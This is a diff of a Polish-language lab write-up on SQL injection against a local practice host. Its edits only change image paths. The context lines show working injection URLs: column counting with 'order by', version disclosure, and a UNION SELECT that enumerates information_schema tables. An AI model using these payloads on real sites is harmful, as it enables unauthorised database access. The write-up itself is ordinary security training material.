@@ -13,7 +13,7 @@ http://192.168.56.6/cat.php?id=1 order by 4
 http://192.168.56.6/cat.php?id=1 order by 5
 ```
 
-![alt text](../img/image_col.png)
+![alt text](img\image_col.png)
 
 dopiro przy order by 5 wyskakuje bląd, zatem kolumn jest 4
 ```
@@ -46,7 +46,7 @@ Wyciągnięcie wartości @@version potwierdza MySQL i wersję 5.1.63-0+squeeze1 
 http://vulnerable/cat.php?dowolny%20string%20id=1
 ```
 
-![undefined index](../img/cat_undefined.png)
+![undefined index](img\cat_undefined.png)
 
 "undefined index" po zmianie query string wskazuje, że aplikacja odczytuje konkretne klucze z tablicy GET i nie obsługuje nieoczekiwanych parametrów — to dodatkowy symptom niezwalidowanego wejścia.
 
@@ -56,7 +56,7 @@ http://vulnerable/cat.php?dowolny%20string%20id=1
 http://vulnerable/cat.php?id=1%20union%20select%201,%20table_name,%203,%204%20from%20information_schema.tables
 ```
 
-![tabele](../img/tables.png)
+![tabele](img\tables.png)
 
 ```
 CHARACTER_SETS
